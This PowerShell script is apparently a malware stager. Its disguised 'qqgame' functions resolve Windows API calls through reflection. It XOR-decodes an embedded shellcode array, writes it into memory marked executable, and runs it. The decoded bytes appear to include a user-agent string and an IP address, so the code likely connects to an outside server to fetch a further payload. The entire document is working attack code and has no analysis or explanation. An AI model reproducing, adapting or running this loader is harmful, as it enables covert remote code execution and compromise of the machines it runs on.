Set-StrictMode -Version 2

function qqgame_tim {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function qqgame_gg {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

If ([IntPtr]::size -eq 8) {
	[Byte[]]$ver_kk = [Byte[]](223,107,160,199,211,203,235,35,35,35,98,114,98,115,113,114,117,107,18,241,70,107,168,113,67,107,168,113,59,107,168,113,3,107,168,81,115,107,44,148,105,105,110,18,234,107,18,227,143,31,66,95,33,15,3,98,226,234,46,98,34,226,193,206,113,98,114,107,168,113,3,168,97,31,107,34,243,69,162,91,59,40,33,86,81,168,163,171,35,35,35,107,166,227,87,68,107,34,243,115,168,107,59,103,168,99,3,106,34,243,192,117,107,220,234,98,168,23,171,107,34,245,110,18,234,107,18,227,143,98,226,234,46,98,34,226,27,195,86,210,111,32,111,7,43,102,26,242,86,251,123,103,168,99,7,106,34,243,69,98,168,47,107,103,168,99,63,106,34,243,98,168,39,171,107,34,243,98,123,98,123,125,122,121,98,123,98,122,98,121,107,160,207,3,98,113,220,195,123,98,122,121,107,168,49,202,108,220,220,220,126,73,35,106,157,84,74,77,74,77,70,87,35,98,117,106,170,197,111,170,210,98,153,111,84,5,36,220,246,107,18,234,107,18,241,110,18,227,110,18,234,98,115,98,115,98,153,25,117,90,132,220,246,200,80,121,107,170,226,98,155,157,54,35,35,110,18,234,98,114,98,114,73,32,98,114,98,153,116,170,188,229,220,246,200,122,120,107,170,226,107,18,241,106,170,251,110,18,234,113,75,35,33,99,167,113,113,98,153,200,118,13,24,220,246,107,170,229,107,160,224,115,73,41,124,107,170,210,107,170,249,106,228,227,220,220,220,220,110,18,234,113,113,98,153,14,37,59,88,220,246,166,227,44,166,190,34,35,35,107,220,236,44,167,175,34,35,35,200,240,202,199,34,35,35,203,129,220,220,220,12,118,73,27,69,35,32,70,208,234,141,85,79,243,238,71,238,90,70,231,250,18,13,250,88,191,175,103,131,212,26,54,112,14,93,123,143,201,139,178,82,155,250,185,17,198,137,166,53,24,88,15,72,34,221,100,58,199,226,25,65,216,156,109,251,157,91,211,87,13,203,140,91,111,55,216,156,110,76,35,118,80,70,81,14,98,68,70,77,87,25,3,110,76,89,74,79,79,66,12,22,13,19,3,11,64,76,78,83,66,87,74,65,79,70,24,3,110,112,106,102,3,26,13,19,24,3,116,74,77,71,76,84,80,3,109,119,3,21,13,18,24,3,119,81,74,71,70,77,87,12,22,13,19,24,3,123,97,111,116,115,20,24,3,121,86,77,70,116,115,20,10,46,41,35,131,107,57,204,32,248,83,166,108,75,61,215,105,158,128,252,33,49,111,171,193,116,68,212,83,98,47,165,151,67,26,116,160,205,250,126,10,221,83,36,22,253,204,6,173,252,231,213,248,150,63,109,192,25,111,88,177,69,134,32,107,255,38,202,192,6,118,51,2,209,193,20,178,96,153,30,73,56,103,146,44,2,246,165,6,29,179,231,236,104,175,240,153,179,148,105,79,145,28,178,153,145,239,149,17,55,8,11,53,44,228,119,168,58,122,184,73,22,1,39,234,168,76,222,237,226,125,105,195,6,134,62,65,110,190,53,94,249,51,9,218,145,204,239,239,196,71,10,216,42,42,87,102,212,87,97,131,126,189,189,190,146,209,45,169,18,109,218,224,19,224,180,166,99,192,28,195,4,37,24,44,9,180,158,103,18,14,129,102,137,199,217,23,16,126,114,141,88,103,82,144,158,17,72,132,34,137,162,35,98,157,211,150,129,117,220,246,107,18,234,153,35,35,99,35,98,155,35,51,35,35,98,154,99,35,35,35,98,153,123,135,112,198,220,246,107,176,112,112,107,170,196,107,170,210,107,170,249,98,155,35,3,35,35,106,170,218,98,153,49,181,170,193,220,246,107,160,231,3,166,227,87,149,69,168,36,107,34,224,166,227,86,244,123,123,123,107,38,35,35,35,35,115,224,203,188,222,220,220,23,17,13,18,26,17,13,18,22,17,13,18,27,17,35,49,23,117,91)

	for ($x = 0; $x -lt $ver_kk.Count; $x++) {
		$ver_kk[$x] = $ver_kk[$x] -bxor 35
	}

	$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((qqgame_tim kernel32.dll VirtualAlloc), (qqgame_gg @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
	$var_buffer = $var_va.Invoke([IntPtr]::Zero, $ver_kk.Length, 0x3000, 0x40)
	[System.Runtime.InteropServices.Marshal]::Copy($ver_kk, 0, $var_buffer, $ver_kk.length)

	$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (qqgame_gg @([IntPtr]) ([Void])))
	$var_runme.Invoke([IntPtr]::Zero)
}
